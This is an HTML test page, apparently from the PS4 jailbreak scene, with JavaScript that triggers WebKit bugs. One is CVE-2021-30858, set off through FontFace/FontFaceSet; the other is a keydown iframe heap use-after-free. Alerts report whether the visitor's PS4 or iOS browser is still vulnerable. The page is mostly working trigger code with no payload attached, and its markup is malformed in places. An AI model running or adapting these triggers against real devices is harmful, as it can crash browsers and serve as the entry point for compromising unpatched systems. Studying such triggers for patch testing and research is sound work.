<html>
    <head>
        <title>Test</title>
        <body
            <p>...webkit exploit coming</p>
            <script>
                function testwebkit() {
                    alert("THIS SITE IS A TEST FOR THE WEBKIT VULNERABILITY FOR THE PS4\nCLICK OK\nIF YOU DON'T SEE ANY 'API PATCHED' ERROR OR 'MEMORY ERROR' ALERT OR ANY ERROR ALERT THAT'S MEAN IT'S NOT PATCH");
        
                    CheckAPI();
                }
        
                function CheckAPI() {
                    try {
                        API();
                    }catch(e){
                        var ge = e.message;
                        if (ge == "The string did not match the expected pattern."){
                            document.getElementById("API").innerHTML = "API not patch !\n";
                        } else if (ge == "Illegal constructor.") {
                            document.getElementById("API").innerHTML = "API not implement !\n";
                        } else {
                            document.getElementById("API").innerHTML = e.message;
                        }
                    }
        
                }
        
                function API() {
                    let font = new FontFace("font1", 'url()', {});
        
                    var fontFaceSet = new FontFaceSet([font]);
        
                    font.family = "font2";
        
                    document.getElementById("API").innerHTML = "API patched !\n";
        
                    CheckWE();
        
                }
        
                function CheckWE() {
                    let font = new FontFace("font1", '', {}, ConfirmWork());
        
                    var fontFaceSet = new FontFaceSet([font]);
        
                    font.family = "font2";
        
                    NotWork();
        
                }
        
                function ConfirmWork() {
                    //alert("Webkit Work !");
                    document.getElementById("WE").innerHTML = "Webkit vulnerability work !\n";
                    //go();
                }
        
                function NotWork() {
                    //alert("Webkit Patched here !");
                    document.getElementById("WE").innerHTML = "Webkit vulnerability not work !\n";
                }
            </script>
        
            <body>
                <button onclick="testwebkit()">CVE Test V 1.0</button>
                <p id="API"></p>
                <p id="WE"></p>
                <script>
                    async function cve() {
                        alert("Press 'OK' and after this, press any key")
                        frame = document.body.appendChild(document.createElement('iframe'));
                        frame.contentWindow.focus();
                        frame.contentDocument.addEventListener('keydown', () => {
                        frame.remove();
                        alert("The webkit works perfectly on your version!");
                        });
                    }
                    /// EventHandler::keyEvent` doesn't protect `this` from being unexpectedly destroyed by a JS event handler. 
                    /// Such a handler may be triggered by a `keydown` event inside `internalKeyEvent`[1]. When control returns to `keyEvent`, it loads the `m_frame` field from potentially freed memory[2].
                    
                    async function testwebkit() {
                        try{
                        alert("Testing CVE-2021-30858 on PS4 8.XX, Press OK ! (Work on IOS) \n If you get this error message: ReferenceError: FontFaceSet is not defined. \n This means that the exploit does not work on your firmware or system.");
                        let font = new FontFace('font1', 'url()',{});
                        alert("FontFace(). Test 1 OK!");
                        var fontFaceSet = new FontFaceSet([font]);
                        alert("FontFaceSet(). Test 2 OK!");
                        
                        font.family = 'font2';
                        alert("CVE-2021-30858 WEBKIT WORK ON YOUR SYSTEM!");
                          }
                        catch(e){
                            alert(e);
                        }
                    }
            
                    async function testwebkit2() {
                        try{
                        alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Memory Errors'.\n If 'Bug Patched' Msgs or 'Memory Error Msg' is show means this bug does not work on your current FW and has been patched!!!\nIf you get 'The String did not match the expected pattern it's OK, Means it's working as expected! :P '");
                        let font = new FontFace('font1','',{});
                        var fontFaceSet = new FontFaceSet([font]);
                        font.family = 'font2';
                        alert("Bug Patched :(");
                           }
                        catch(e){
                            alert(e);
                        }
            }
                </script>
                <body>
                    
                    <button class="button" onclick="testwebkit()">CVE-2021-30858 On PS4 Browser 8.XX</button>
                        <button class="button" onclick="testwebkit2()">Webkit Testing (PS4, iOS)</button><br>
                        <button class="button" onclick="cve()">Webkit Heap-Use-After-Free</button>
                        <button class="button" onclick="location.href = '/cve/cve.html'">CVE: Slow_Path_Profile_Catch</butto></p2><br>
                </body>
            </body>
        </body>
    </head>
</html>
